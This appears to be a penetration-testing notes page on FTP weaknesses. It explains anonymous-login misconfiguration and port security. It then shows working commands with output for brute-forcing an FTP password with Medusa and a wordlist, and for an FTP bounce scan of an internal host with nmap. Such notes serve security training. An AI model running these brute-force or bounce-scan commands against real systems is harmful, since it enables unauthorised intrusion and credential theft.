---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# FTP

## Misconfigurations

### Anonymous Authentication

Anonymous login is dangerous if read and write permissions have not been set up correctly for the FTP service, this is because with the anonymous login, the company could have stored sensitive information in a folder that the anonymous user of the FTP service could have access to.

{% hint style="info" %}
To gain access with the anonymous login, use the `anonymous` username and _**no**_ password.
{% endhint %}

This may allow an attacker to access sensitive information or even upload dangerous scripts. Using other vulnerabilities, such as path traversal in a web application, the attacker would be able to find out where this file is located and execute it.

### Port Security

Modern FTP servers only accept [**PORT** ](https://www.geeksforgeeks.org/computer-networks/port-security-in-computer-network/)commands that initiate a connection from the originating host. It denies any other `PORT` commands that may try to connect to different device IPs. An individual can check for this default feature in their systems.

If this setting is disabled the server may be open to attack such as: [#ftp-bounce-attack](ftp.md#ftp-bounce-attack "mention")

## Brute-Forcing

### Using Medusa

```bash
clue@machine[~]$ medusa -u greg -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: greg (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: greg (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: greg (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: greg Password: password [SUCCESS]
```

## FTP Bounce Attack

An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

{% hint style="warning" %}
## Old School Attack

Modern FTP servers by default prevent this attack, but if the server is misconfigured it may be vulnerable to the FTP Bounce Attack.

[#port-security](ftp.md#port-security "mention")
{% endhint %}

Consider we are targeting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The [nmap](../../../toolbox/tooling/information-gathering/nmap/ "mention") `-b` flag can be used to perform an FTP bounce attack:

```bash
clue@machine[~]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```
